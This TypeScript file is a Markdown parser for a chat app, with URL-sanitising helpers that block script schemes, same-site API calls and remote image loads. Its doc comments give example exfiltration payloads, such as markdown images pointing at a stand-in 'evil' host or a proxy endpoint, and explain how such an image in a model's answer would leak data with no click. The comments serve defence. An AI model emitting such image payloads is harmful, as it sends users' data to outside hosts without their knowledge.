/**
 * Small Markdown parser: source → AST. No HTML is ever produced or parsed,
 * so rendering the AST (see `components/Markdown.tsx`) is safe by
 * construction — there is no innerHTML anywhere in the pipeline.
 *
 * Covers the everyday subset: ATX + setext headings, paragraphs, hard/soft
 * breaks, fenced code, blockquotes, nested ordered/unordered/task lists,
 * tables, thematic breaks; inline code, strong, emphasis, strikethrough,
 * links, images, autolinks, and bare URLs. Not CommonMark-complete on
 * purpose — raw HTML is treated as text.
 */

export type MdInline =
  | { t: 'text'; v: string }
  | { t: 'code'; v: string }
  | { t: 'strong' | 'em' | 'del'; c: MdInline[] }
  | { t: 'link'; href: string; title?: string; c: MdInline[] }
  | { t: 'image'; src: string; alt: string; title?: string }
  | { t: 'br' }

export interface MdListItem {
  c: MdBlock[]
  /** Present for task-list items (`- [ ]` / `- [x]`). */
  checked?: boolean
}

export type MdAlign = 'left' | 'center' | 'right' | null

export type MdBlock =
  | { t: 'heading'; level: number; id: string; c: MdInline[] }
  | { t: 'paragraph'; c: MdInline[] }
  | { t: 'code'; lang?: string; v: string }
  | { t: 'quote'; c: MdBlock[] }
  | { t: 'list'; ordered: boolean; start?: number; items: MdListItem[] }
  | { t: 'hr' }
  | { t: 'table'; align: MdAlign[]; head: MdInline[][]; rows: MdInline[][][] }

export function parseMarkdown(src: string): MdBlock[] {
  return parseBlocks(src.replace(/\r\n?/g, '\n').split('\n'))
}

// ── Blocks ─────────────────────────────────────────────────────────────

const FENCE = /^ {0,3}(`{3,}|~{3,})[ \t]*([^\s`]*)/
const ATX = /^ {0,3}(#{1,6})(?:[ \t]+(.*?))?[ \t]*#*[ \t]*$/
const HR = /^ {0,3}([-*_])[ \t]*(?:\1[ \t]*){2,}$/
const QUOTE = /^ {0,3}>/
const SETEXT = /^ {0,3}(=+|-+)[ \t]*$/
const TABLE_SEP = /^[ \t]*\|?[ \t]*:?-+:?[ \t]*(\|[ \t]*:?-+:?[ \t]*)*\|?[ \t]*$/

interface ListStart {
  ordered: boolean
  start: number
  /** Column where the item's content begins; continuation lines indent to here. */
  contentIndent: number
  content: string
}

function listItemStart(line: string): ListStart | null {
  const m = /^( {0,3})([-*+]|\d{1,9}[.)])( {1,4}|\t)(.*)$/.exec(line)
  if (m) {
    const marker = m[2]
    return {
      ordered: /\d/.test(marker),
      start: /\d/.test(marker) ? parseInt(marker, 10) : 1,
      contentIndent: m[1].length + marker.length + (m[3] === '\t' ? 1 : m[3].length),
      content: m[4],
    }
  }
  // Empty item (`-` alone on a line).
  const e = /^( {0,3})([-*+]|\d{1,9}[.)])[ \t]*$/.exec(line)
  if (e) return { ordered: /\d/.test(e[2]), start: /\d/.test(e[2]) ? parseInt(e[2], 10) : 1, contentIndent: e[1].length + e[2].length + 1, content: '' }
  return null
}

const leadingSpaces = (s: string) => /^ */.exec(s)![0].length

/** True when the line would interrupt a paragraph. */
function isBlockStart(line: string): boolean {
  return FENCE.test(line) || ATX.test(line) || HR.test(line) || QUOTE.test(line) || listItemStart(line) !== null
}

function splitRow(line: string): string[] {
  let s = line.trim()
  if (s.startsWith('|')) s = s.slice(1)
  if (s.endsWith('|') && !s.endsWith('\\|')) s = s.slice(0, -1)
  const cells: string[] = []
  let cur = ''
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]
    if (ch === '\\' && s[i + 1] === '|') {
      cur += '|'
      i++
    } else if (ch === '|') {
      cells.push(cur.trim())
      cur = ''
    } else cur += ch
  }
  cells.push(cur.trim())
  return cells
}

function parseBlocks(lines: string[]): MdBlock[] {
  const out: MdBlock[] = []
  let i = 0
  while (i < lines.length) {
    const line = lines[i]
    if (!line.trim()) {
      i++
      continue
    }

    const fence = FENCE.exec(line)
    if (fence) {
      const marker = fence[1]
      const close = new RegExp(`^ {0,3}${marker[0] === '`' ? '`' : '~'}{${marker.length},}[ \\t]*$`)
      const buf: string[] = []
      i++
      while (i < lines.length && !close.test(lines[i])) buf.push(lines[i++])
      i++
      out.push({ t: 'code', lang: fence[2] || undefined, v: buf.join('\n') })
      continue
    }

    const atx = ATX.exec(line)
    if (atx) {
      const text = atx[2] ?? ''
      out.push({ t: 'heading', level: atx[1].length, id: slugify(text), c: parseInline(text) })
      i++
      continue
    }

    if (HR.test(line)) {
      out.push({ t: 'hr' })
      i++
      continue
    }

    if (QUOTE.test(line)) {
      const buf: string[] = []
      while (i < lines.length && (QUOTE.test(lines[i]) || (lines[i].trim() && buf.length && !isBlockStart(lines[i]) && buf[buf.length - 1].trim()))) {
        buf.push(lines[i].replace(/^ {0,3}> ?/, ''))
        i++
      }
      out.push({ t: 'quote', c: parseBlocks(buf) })
      continue
    }

    const first = listItemStart(line)
    if (first) {
      const items: MdListItem[] = []
      while (i < lines.length) {
        const m = listItemStart(lines[i])
        if (!m || m.ordered !== first.ordered) break
        const buf: string[] = [m.content]
        i++
        while (i < lines.length) {
          const l = lines[i]
          if (!l.trim()) {
            let j = i + 1
            while (j < lines.length && !lines[j].trim()) j++
            if (j < lines.length && leadingSpaces(lines[j]) >= m.contentIndent) {
              buf.push('')
              i++
              continue
            }
            break
          }
          if (leadingSpaces(l) >= m.contentIndent) {
            buf.push(l.slice(m.contentIndent))
            i++
            continue
          }
          // Lazy continuation of the item's paragraph.
          if (buf[buf.length - 1].trim() && !isBlockStart(l)) {
            buf.push(l.trim())
            i++
            continue
          }
          break
        }
        let checked: boolean | undefined
        const task = /^\[([ xX])\](?:[ \t]+|$)/.exec(buf[0])
        if (task) {
          checked = task[1] !== ' '
          buf[0] = buf[0].slice(task[0].length)
        }
        items.push({ c: parseBlocks(buf), checked })
        // Blank lines between items keep the list going only if another item follows.
        let j = i
        while (j < lines.length && !lines[j].trim()) j++
        const next = j < lines.length ? listItemStart(lines[j]) : null
        if (next && next.ordered === first.ordered) i = j
        else break
      }
      out.push({ t: 'list', ordered: first.ordered, start: first.ordered && first.start !== 1 ? first.start : undefined, items })
      continue
    }

    if (i + 1 < lines.length && line.includes('|') && TABLE_SEP.test(lines[i + 1])) {
      const head = splitRow(line)
      const align: MdAlign[] = splitRow(lines[i + 1]).map((c) => {
        const l = c.startsWith(':')
        const r = c.endsWith(':')
        return l && r ? 'center' : r ? 'right' : l ? 'left' : null
      })
      if (head.length === align.length) {
        i += 2
        const rows: string[][] = []
        while (i < lines.length && lines[i].trim() && !isBlockStart(lines[i])) rows.push(splitRow(lines[i++]))
        out.push({
          t: 'table',
          align,
          head: head.map(parseInline),
          rows: rows.map((r) => head.map((_, k) => parseInline(r[k] ?? ''))),
        })
        continue
      }
    }

    // Paragraph: gather until a blank line or something that interrupts it.
    const buf: string[] = [line]
    i++
    let setext: number | undefined
    while (i < lines.length && lines[i].trim()) {
      const s = SETEXT.exec(lines[i])
      if (s) {
        setext = s[1][0] === '=' ? 1 : 2
        i++
        break
      }
      if (isBlockStart(lines[i])) break
      buf.push(lines[i++])
    }
    const text = buf.map((l) => l.replace(/^ +/, '')).join('\n')
    if (setext) out.push({ t: 'heading', level: setext, id: slugify(text), c: parseInline(text.trim()) })
    else out.push({ t: 'paragraph', c: parseInline(text) })
  }
  return out
}

// ── Inlines ────────────────────────────────────────────────────────────

const RE = {
  escape: /\\([!"#$%&'()*+,\-./:;<=>?@[\\\]^_`{|}~])/y,
  code: /(`+)([^`]|[^`][\s\S]*?[^`])\1(?!`)/y,
  // A URL may hold one level of balanced parentheses (Wikipedia's `Graph_(mathematics)`).
  image: /!\[([^\]]*)\]\([ \t]*<?((?:[^\s()>]|\([^\s()]*\))*)>?(?:[ \t]+(?:"([^"]*)"|'([^']*)'))?[ \t]*\)/y,
  link: /\[((?:[^[\]]|\[[^\]]*\])*)\]\([ \t]*<?((?:[^\s()>]|\([^\s()]*\))*)>?(?:[ \t]+(?:"([^"]*)"|'([^']*)'))?[ \t]*\)/y,
  strong: /(\*\*|__)(?=\S)([\s\S]*?\S)\1/y,
  em: /(\*|_)(?=\S)([\s\S]*?\S)\1(?!\1)/y,
  del: /~~(?=\S)([\s\S]*?\S)~~/y,
  autolink: /<((?:https?|mailto):[^\s<>]+)>/y,
  url: /https?:\/\/[^\s<]*[^\s<.,;:!?)'"\]]/y,
  hardbreak: /(?: {2,}|\\)\n/y,
}

function at(re: RegExp, src: string, i: number): RegExpExecArray | null {
  re.lastIndex = i
  return re.exec(src)
}

export function parseInline(src: string): MdInline[] {
  const out: MdInline[] = []
  let text = ''
  const flush = () => {
    if (text) out.push({ t: 'text', v: text })
    text = ''
  }
  let i = 0
  while (i < src.length) {
    const ch = src[i]
    let m: RegExpExecArray | null

    if (ch === '\\') {
      if ((m = at(RE.hardbreak, src, i))) {
        flush()
        out.push({ t: 'br' })
        i += m[0].length
        continue
      }
      if ((m = at(RE.escape, src, i))) {
        text += m[1]
        i += m[0].length
        continue
      }
    } else if (ch === '`') {
      if ((m = at(RE.code, src, i))) {
        flush()
        let v = m[2]
        if (v.length > 2 && v.startsWith(' ') && v.endsWith(' ') && v.trim()) v = v.slice(1, -1)
        out.push({ t: 'code', v })
        i += m[0].length
        continue
      }
    } else if (ch === '!' && src[i + 1] === '[') {
      if ((m = at(RE.image, src, i))) {
        flush()
        out.push({ t: 'image', alt: m[1], src: m[2], title: m[3] ?? m[4] })
        i += m[0].length
        continue
      }
    } else if (ch === '[') {
      if ((m = at(RE.link, src, i))) {
        flush()
        out.push({ t: 'link', href: m[2], title: m[3] ?? m[4], c: parseInline(m[1]) })
        i += m[0].length
        continue
      }
    } else if (ch === '*' || ch === '_') {
      const wordBefore = ch === '_' && i > 0 && /\w/.test(src[i - 1])
      if (!wordBefore && (m = at(RE.strong, src, i))) {
        flush()
        out.push({ t: 'strong', c: parseInline(m[2]) })
        i += m[0].length
        continue
      }
      if (!wordBefore && (m = at(RE.em, src, i))) {
        flush()
        out.push({ t: 'em', c: parseInline(m[2]) })
        i += m[0].length
        continue
      }
    } else if (ch === '~' && src[i + 1] === '~') {
      if ((m = at(RE.del, src, i))) {
        flush()
        out.push({ t: 'del', c: parseInline(m[1]) })
        i += m[0].length
        continue
      }
    } else if (ch === '<') {
      if ((m = at(RE.autolink, src, i))) {
        flush()
        out.push({ t: 'link', href: m[1], c: [{ t: 'text', v: m[1] }] })
        i += m[0].length
        continue
      }
    } else if (ch === 'h' && (i === 0 || /[\s(]/.test(src[i - 1]))) {
      if ((m = at(RE.url, src, i))) {
        flush()
        out.push({ t: 'link', href: m[0], c: [{ t: 'text', v: m[0] }] })
        i += m[0].length
        continue
      }
    } else if (ch === ' ' && src[i + 1] === ' ') {
      if ((m = at(RE.hardbreak, src, i))) {
        flush()
        out.push({ t: 'br' })
        i += m[0].length
        continue
      }
    } else if (ch === '\n') {
      text += ' '
      i++
      continue
    }

    text += ch
    i++
  }
  flush()
  return out
}

// ── Helpers ────────────────────────────────────────────────────────────

export function slugify(s: string): string {
  return s
    .toLowerCase()
    .replace(/[`*_~[\]()!]/g, '')
    .replace(/[^\p{L}\p{N}]+/gu, '-')
    .replace(/^-+|-+$/g, '')
}

/** Plain text of an inline run — used for heading ids, outlines, and search. */
export function inlineText(nodes: MdInline[]): string {
  return nodes
    .map((n) => {
      switch (n.t) {
        case 'text':
        case 'code':
          return n.v
        case 'image':
          return n.alt
        case 'br':
          return '\n'
        default:
          return inlineText(n.c)
      }
    })
    .join('')
}

export interface Outline {
  level: number
  id: string
  text: string
}

export function outlineOf(blocks: MdBlock[]): Outline[] {
  const out: Outline[] = []
  for (const b of blocks) if (b.t === 'heading') out.push({ level: b.level, id: b.id, text: inlineText(b.c) })
  return out
}

/**
 * How an image may be shown. `inline` loads it (a `data:` picture, a path on
 * this origin); `remote` is another host, which is told about the page the
 * moment the image loads — and whatever the URL carries with it. A model's
 * answer or an imported chat is text someone else wrote, so `![](https://evil/?d=…)`
 * in it would send data out with no click: `Markdown` shows a remote image as
 * a link to load it instead, unless the page is the app's own.
 */
export function imageKind(src: string): 'inline' | 'remote' {
  return isRemoteUrl(src) ? 'remote' : 'inline'
}

/**
 * Whether loading `src` would send a request to another host: anything but a `data:` URL or an address that resolves
 * to this page's own origin. Judged by where the browser would really send it, not by how the text looks —
 * `//evil.example/x`, `/\evil.example/x` and `\\evil` have no scheme but are another host all the same.
 */
export function isRemoteUrl(src: string): boolean {
  const s = src.trim()
  if (/^data:/i.test(s)) return false
  const base = pageBase()
  const at = resolved(s, base)
  return !(at && at.origin === new URL(base).origin) || isOwnFunction(at)
}

/**
 * Whether a URL is one of this site's own functions (`/api/…`), judged as the server would route it: decoded,
 * any case, `/api/fetch.pdf` as well as `/api/fetch`. Such a URL is on this origin, so it would load at once — and
 * `/api/fetch` reads any address on the page's behalf (ungated on the dev server), so `![](/api/fetch?url=https://evil/?d=…)`
 * in a model's answer would send data out with no click. A URL from data never calls them: images, links and frames
 * made from data refuse it, as `core/net/url.ts` does for a tool.
 */
export function isOwnFunction(url: string | URL): boolean {
  const base = pageBase()
  const at = typeof url === 'string' ? resolved(url.trim(), base) : url
  if (!at || at.origin !== new URL(base).origin) return false
  let path = at.pathname
  try {
    path = decodeURIComponent(path)
  } catch {
    /* as written */
  }
  return /^\/+api(?:[/.;\\]|$)/i.test(path.replace(/\\/g, '/'))
}

/** The `src` an image from data may have: a `data:` picture of a known type, a same-origin `blob:`, a path, or http(s) — never a script-capable scheme. */
export function dataImageSrc(value: unknown): string | undefined {
  if (typeof value !== 'string') return undefined
  const s = value.trim()
  if (/^blob:/i.test(s)) return isRemoteUrl(s) ? undefined : s
  return safeUrl(s, { image: true })
}

/** Where relative URLs resolve: the page, or — with no http(s) page (Node, a file) — a stand-in origin of the app's own. */
const STAND_IN_BASE = 'https://app.invalid/'
function pageBase(): string {
  try {
    const href = globalThis.location?.href
    if (href && /^https?:/i.test(href)) return href
  } catch {
    /* no location */
  }
  return STAND_IN_BASE
}
function resolved(url: string, base: string): URL | undefined {
  try {
    return new URL(url, base)
  } catch {
    return undefined
  }
}

/** Only allow URL schemes that can't run script. A relative URL passes through only when it stays on this origin, and never to the site's own functions (`isOwnFunction`). */
export function safeUrl(url: string, { image = false } = {}): string | undefined {
  const u = url.trim()
  if (!u) return undefined
  if (/^https?:/i.test(u)) return isOwnFunction(u) ? undefined : u
  if (/^(mailto|tel):/i.test(u)) return u
  if (image && /^data:image\/(png|jpe?g|gif|webp|svg\+xml);/i.test(u)) return u
  if (/^[a-z][a-z0-9+.-]*:/i.test(u)) return undefined
  // No scheme: a path or a fragment — unless the browser would read it as another host (`//host`, `/\host`, `\\host`,
  // or those with a tab or newline inside, which the URL parser drops). Such a URL is given back absolute, so it is
  // seen for what it is: a link to that host, an image that waits for a click.
  const base = pageBase()
  const at = resolved(u, base)
  if (!at) return undefined
  if (at.origin !== new URL(base).origin) return /^https?:$/.test(at.protocol) ? at.href : undefined
  return isOwnFunction(at) ? undefined : u
}
